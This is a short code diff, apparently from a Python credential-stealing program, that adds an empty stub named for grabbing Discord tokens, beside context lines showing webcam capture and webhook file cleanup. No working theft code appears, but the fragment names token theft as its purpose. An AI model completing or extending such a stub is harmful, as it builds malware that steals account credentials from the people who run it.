@@ -379,6 +379,12 @@ def getCam():
         webhook.remove_files()
 
 
+# Get Discord Token (Discord APP)
+
+
+def getDcTokenApp():
+    print("")
+
 # Clean Up
 
 
